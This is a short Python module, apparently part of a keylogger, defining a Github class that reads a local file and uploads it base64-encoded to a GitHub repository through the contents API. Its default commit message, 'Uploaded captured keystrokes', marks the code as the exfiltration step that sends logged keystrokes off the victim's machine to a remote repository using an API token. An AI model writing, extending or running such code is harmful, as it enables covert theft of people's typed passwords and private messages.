import base64
import json
import urllib.request
import stamp

class Github:
    def __init__(self, config):
        self.config = config

    def commit_changes(self, file_path, message="Uploaded captured keystrokes"):
        with open(file_path, "rb") as f:
            contents = f.read()
        gh_file_path = stamp.timestamped(self.config.file_path, self.config.options.time_format)
        url = f"https://api.github.com/repos/{self.config.user}/{self.config.repo}/contents/{gh_file_path}"
        headers = {
            "Accept": "application/vnd.github+json",
            "Authorization": f"Bearer {self.config.api_token}"
        }
        data = {
            "message": message,
            "content": base64.b64encode(contents).decode("utf-8"),
        }
        req = urllib.request.Request(url, headers=headers, method="PUT")
        req.data = bytes(json.dumps(data), encoding="utf-8")
        urllib.request.urlopen(req)
